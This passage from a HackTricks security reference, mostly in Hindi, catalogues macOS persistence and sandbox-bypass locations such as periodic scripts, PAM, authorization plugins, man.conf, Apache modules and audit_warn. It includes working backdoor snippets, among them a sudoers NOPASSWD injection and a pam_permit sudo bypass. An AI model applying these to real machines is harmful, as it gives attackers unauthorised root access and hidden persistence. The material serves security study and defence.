अपने स्वयं के आयातक को बनाने के लिए, आप इस प्रोजेक्ट से शुरू कर सकते हैं: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) और फिर नाम, **`CFBundleDocumentTypes`** को बदलें और **`UTImportedTypeDeclarations`** जोड़ें ताकि यह उस एक्सटेंशन का समर्थन करे जिसे आप समर्थन करना चाहते हैं और उन्हें **`schema.xml`** में परिलक्षित करें।\
फिर **`GetMetadataForFile`** फ़ंक्शन के कोड को **बदलें** ताकि जब एक फ़ाइल बनाई जाए जिसमें संसाधित एक्सटेंशन हो, तो आपका पेलोड निष्पादित हो।

अंत में, **अपना नया `.mdimporter` बनाएं और कॉपी करें** और इसे पिछले स्थानों में से एक में रखें और आप **लॉग की निगरानी** करके या **`mdimport -L.`** चेक करके देख सकते हैं कि यह कब लोड होता है।

### ~~Preference Pane~~

{% hint style="danger" %}
ऐसा लगता है कि यह अब काम नहीं कर रहा है।
{% endhint %}

Writeup: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* सैंडबॉक्स को बायपास करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* इसे एक विशिष्ट उपयोगकर्ता क्रिया की आवश्यकता है
* TCC बायपास: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### विवरण

ऐसा लगता है कि यह अब काम नहीं कर रहा है।

## रूट सैंडबॉक्स बायपास

{% hint style="success" %}
यहां आप **सैंडबॉक्स बायपास** के लिए उपयोगी प्रारंभ स्थान पा सकते हैं जो आपको **रूट** होने पर और/या अन्य **अजीब शर्तों** की आवश्यकता होने पर **किसी चीज़ को फ़ाइल में लिखकर** सरलता से निष्पादित करने की अनुमति देता है।
{% endhint %}

### आवधिक

Writeup: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* सैंडबॉक्स को बायपास करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* लेकिन आपको रूट होना चाहिए
* TCC बायपास: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* रूट आवश्यक
* **ट्रिगर**: जब समय आए
* `/etc/daily.local`, `/etc/weekly.local` या `/etc/monthly.local`
* रूट आवश्यक
* **ट्रिगर**: जब समय आए

#### विवरण और शोषण

आवधिक स्क्रिप्ट (**`/etc/periodic`**) को `/System/Library/LaunchDaemons/com.apple.periodic*` में कॉन्फ़िगर किए गए **लॉन्च डेमन्स** के कारण निष्पादित किया जाता है। ध्यान दें कि `/etc/periodic/` में संग्रहीत स्क्रिप्ट **फाइल के मालिक** के रूप में **निष्पादित** की जाती हैं, इसलिए यह संभावित विशेषाधिकार वृद्धि के लिए काम नहीं करेगा।

{% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

अन्य आवधिक स्क्रिप्ट हैं जो **`/etc/defaults/periodic.conf`** में निर्दिष्ट की गई हैं:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
यदि आप `/etc/daily.local`, `/etc/weekly.local` या `/etc/monthly.local` में से किसी भी फ़ाइल को लिखने में सफल होते हैं, तो यह **जल्द या बाद में निष्पादित होगा**।

{% hint style="warning" %}
ध्यान दें कि आवधिक स्क्रिप्ट **स्क्रिप्ट के मालिक के रूप में निष्पादित होगी**। इसलिए यदि एक नियमित उपयोगकर्ता स्क्रिप्ट का मालिक है, तो यह उस उपयोगकर्ता के रूप में निष्पादित होगी (यह विशेषाधिकार वृद्धि हमलों को रोक सकता है)।
{% endhint %}

### PAM

लेख: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
लेख: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* सैंडबॉक्स को बायपास करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* लेकिन आपको रूट होना चाहिए
* TCC बायपास: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

* रूट हमेशा आवश्यक है

#### विवरण और शोषण

चूंकि PAM **स्थिरता** और मैलवेयर पर अधिक केंद्रित है, जो macOS के अंदर आसान निष्पादन पर है, यह ब्लॉग इस तकनीक को बेहतर ढंग से समझने के लिए विस्तृत व्याख्या नहीं देगा, **इस तकनीक को बेहतर समझने के लिए लेख पढ़ें**।

PAM मॉड्यूल की जांच करें:
```bash
ls -l /etc/pam.d
```
एक स्थायीता/अधिकार वृद्धि तकनीक जो PAM का दुरुपयोग करती है, उतनी ही आसान है जितनी कि मॉड्यूल /etc/pam.d/sudo को संशोधित करना और शुरुआत में यह पंक्ति जोड़ना:
```bash
auth       sufficient     pam_permit.so
```
तो यह **इस तरह** कुछ ऐसा दिखेगा:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
और इसलिए **`sudo` का उपयोग करने का कोई भी प्रयास काम करेगा**।

{% hint style="danger" %}
ध्यान दें कि यह निर्देशिका TCC द्वारा सुरक्षित है, इसलिए यह अत्यधिक संभावना है कि उपयोगकर्ता को पहुंच के लिए एक प्रॉम्प्ट मिलेगा।
{% endhint %}

एक और अच्छा उदाहरण su है, जहाँ आप देख सकते हैं कि PAM मॉड्यूल को पैरामीटर देना भी संभव है (और आप इस फ़ाइल को भी बैकडोर कर सकते हैं):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* सैंडबॉक्स को बायपास करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* लेकिन आपको रूट होना चाहिए और अतिरिक्त कॉन्फ़िगरेशन करनी होगी
* TCC बायपास: ???

#### Location

* `/Library/Security/SecurityAgentPlugins/`
* रूट आवश्यक
* प्लगइन का उपयोग करने के लिए प्राधिकरण डेटाबेस को कॉन्फ़िगर करना भी आवश्यक है

#### Description & Exploitation

आप एक प्राधिकरण प्लगइन बना सकते हैं जो तब निष्पादित होगा जब एक उपयोगकर्ता लॉग-इन करता है ताकि स्थिरता बनाए रखी जा सके। इन प्लगइनों में से एक बनाने के बारे में अधिक जानकारी के लिए पिछले लेखों की जांच करें (और सावधान रहें, एक खराब तरीके से लिखा गया प्लगइन आपको लॉक कर सकता है और आपको अपने मैक को रिकवरी मोड से साफ़ करना होगा)।
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**स्थानांतरित करें** बंडल को उस स्थान पर लोड करने के लिए:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
अंत में इस प्लगइन को लोड करने के लिए **नियम** जोड़ें:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** यह अधिकृतता ढांचे को बताएगा कि इसे **अधिकृतता के लिए एक बाहरी तंत्र को कॉल करने की आवश्यकता होगी**। इसके अलावा, **`privileged`** इसे रूट द्वारा निष्पादित करेगा।

इसे ट्रिगर करें:
```bash
security authorize com.asdf.asdf
```
And then the **staff group should have sudo** access (read `/etc/sudoers` to confirm).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* But you need to be root and the user must use man
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* **`/private/etc/man.conf`**
* Root required
* **`/private/etc/man.conf`**: Whenever man is used

#### Description & Exploit

The config file **`/private/etc/man.conf`** indicate the binary/script to use when opening man documentation files. So the path to the executable could be modified so anytime the user uses man to read some docs a backdoor is executed.

For example set in **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
और फिर `/tmp/view` बनाएं:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* सैंडबॉक्स को बायपास करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* लेकिन आपको रूट होना चाहिए और अपाचे चल रहा होना चाहिए
* TCC बायपास: [🔴](https://emojipedia.org/large-red-circle)
* Httpd के पास अधिकार नहीं हैं

#### स्थान

* **`/etc/apache2/httpd.conf`**
* रूट आवश्यक
* ट्रिगर: जब Apache2 शुरू होता है

#### विवरण & शोषण

आप `/etc/apache2/httpd.conf` में एक लाइन जोड़कर एक मॉड्यूल लोड करने का संकेत दे सकते हैं जैसे: 

{% code overflow="wrap" %}
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

इस तरह आपका संकलित मॉड्यूल अपाचे द्वारा लोड किया जाएगा। केवल एक चीज है कि या तो आपको इसे **एक मान्य एप्पल प्रमाणपत्र के साथ साइन करना होगा**, या आपको **सिस्टम में एक नया विश्वसनीय प्रमाणपत्र जोड़ना होगा** और इसे **इसके साथ साइन करना होगा**।

फिर, यदि आवश्यक हो, तो यह सुनिश्चित करने के लिए कि सर्वर शुरू होगा, आप निष्पादित कर सकते हैं:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Dylb के लिए कोड उदाहरण:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM ऑडिट ढांचा

Writeup: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* सैंडबॉक्स को बायपास करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* लेकिन आपको रूट होना चाहिए, auditd चल रहा होना चाहिए और एक चेतावनी उत्पन्न करनी चाहिए
* TCC बायपास: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

* **`/etc/security/audit_warn`**
* रूट आवश्यक
* **प्रेरक**: जब auditd एक चेतावनी का पता लगाता है

#### विवरण और शोषण

जब भी auditd एक चेतावनी का पता लगाता है, स्क्रिप्ट **`/etc/security/audit_warn`** **चलायी जाती है**। इसलिए आप इसमें अपना पेलोड जोड़ सकते हैं।
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
आप `sudo audit -n` के साथ एक चेतावनी मजबूर कर सकते हैं।

### स्टार्टअप आइटम

{% hint style="danger" %}
**यह अप्रचलित है, इसलिए उन निर्देशिकाओं में कुछ भी नहीं मिलना चाहिए।**
{% endhint %}

**StartupItem** एक निर्देशिका है जो `/Library/StartupItems/` या `/System/Library/StartupItems/` में स्थित होनी चाहिए। एक बार यह निर्देशिका स्थापित हो जाने के बाद, इसमें दो विशेष फ़ाइलें होनी चाहिए:

1. एक **rc स्क्रिप्ट**: एक शेल स्क्रिप्ट जो स्टार्टअप पर निष्पादित होती है।
2. एक **plist फ़ाइल**, विशेष रूप से `StartupParameters.plist` नाम की, जिसमें विभिन्न कॉन्फ़िगरेशन सेटिंग्स होती हैं।

सुनिश्चित करें कि दोनों rc स्क्रिप्ट और `StartupParameters.plist` फ़ाइल **StartupItem** निर्देशिका के अंदर सही तरीके से रखी गई हैं ताकि स्टार्टअप प्रक्रिया उन्हें पहचान सके और उनका उपयोग कर सके।

{% tabs %}
{% tab title="StartupParameters.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% endtab %}

{% tab title="सुपरसेवाकानाम" %}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### ~~emond~~

{% hint style="danger" %}
मैं अपने macOS में इस घटक को नहीं ढूंढ पा रहा हूँ, इसलिए अधिक जानकारी के लिए लेख को देखें
{% endhint %}

लेख: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Apple द्वारा पेश किया गया, **emond** एक लॉगिंग तंत्र है जो अधूरे या संभवतः परित्यक्त प्रतीत होता है, फिर भी यह सुलभ है। जबकि यह एक Mac प्रशासक के लिए विशेष रूप से लाभकारी नहीं है, यह अस्पष्ट सेवा खतरे के अभिनेताओं के लिए एक सूक्ष्म स्थायी विधि के रूप में कार्य कर सकती है, जो संभवतः अधिकांश macOS प्रशासकों द्वारा अनदेखी रह जाएगी।

जो लोग इसके अस्तित्व से अवगत हैं, उनके लिए **emond** के किसी भी दुर्भावनापूर्ण उपयोग की पहचान करना सीधा है। इस सेवा के लिए सिस्टम का LaunchDaemon एक ही निर्देशिका में निष्पादित करने के लिए स्क्रिप्ट की तलाश करता है। इसे जांचने के लिए, निम्नलिखित कमांड का उपयोग किया जा सकता है:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### Location

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* रूट की आवश्यकता है
* **Trigger**: XQuartz के साथ

#### Description & Exploit

XQuartz **अब macOS में स्थापित नहीं है**, इसलिए यदि आप अधिक जानकारी चाहते हैं तो लेख को देखें।

### ~~kext~~

{% hint style="danger" %}
kext को रूट के रूप में स्थापित करना इतना जटिल है कि मैं इसे सैंडबॉक्स से बचने या यहां तक कि स्थिरता के लिए भी नहीं मानूंगा (जब तक कि आपके पास एक exploit न हो)
{% endhint %}

#### Location

एक KEXT को स्टार्टअप आइटम के रूप में स्थापित करने के लिए, इसे **निम्नलिखित स्थानों में से एक में स्थापित किया जाना चाहिए**:

* `/System/Library/Extensions`
* KEXT फ़ाइलें OS X ऑपरेटिंग सिस्टम में निर्मित।
* `/Library/Extensions`
* KEXT फ़ाइलें 3rd पार्टी सॉफ़्टवेयर द्वारा स्थापित की गईं

आप वर्तमान में लोड की गई kext फ़ाइलों को सूचीबद्ध कर सकते हैं:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
For more information about [**kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### Location

* **`/usr/local/bin/amstoold`**
* रूट आवश्यक

#### Description & Exploitation

स्पष्ट रूप से `/System/Library/LaunchAgents/com.apple.amstoold.plist` से `plist` इस बाइनरी का उपयोग कर रहा था जबकि एक XPC सेवा को उजागर कर रहा था... बात यह है कि बाइनरी मौजूद नहीं थी, इसलिए आप वहां कुछ रख सकते हैं और जब XPC सेवा को कॉल किया जाएगा, आपकी बाइनरी को कॉल किया जाएगा।

मैं अब इसे अपने macOS में नहीं ढूंढ पा रहा हूँ।

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### Location

* **`/Library/Preferences/Xsan/.xsanrc`**
* रूट आवश्यक
* **Trigger**: जब सेवा चलाई जाती है (कभी-कभी)

#### Description & exploit

स्पष्ट रूप से इस स्क्रिप्ट को चलाना बहुत सामान्य नहीं है और मैं इसे अपने macOS में भी नहीं ढूंढ सका, इसलिए यदि आप अधिक जानकारी चाहते हैं तो लेखन देखें।

### ~~/etc/rc.common~~

{% hint style="danger" %}
**यह आधुनिक MacOS संस्करणों में काम नहीं कर रहा है**
{% endhint %}

यहां **कमांड्स रखना भी संभव है जो स्टार्टअप पर निष्पादित होंगे।** उदाहरण के लिए नियमित rc.common स्क्रिप्ट:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## स्थायी तकनीकें और उपकरण

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

{% hint style="success" %}
सीखें और AWS हैकिंग का अभ्यास करें:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
सीखें और GCP हैकिंग का अभ्यास करें: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **हमें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो करें।**
* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।

</details>
{% endhint %}
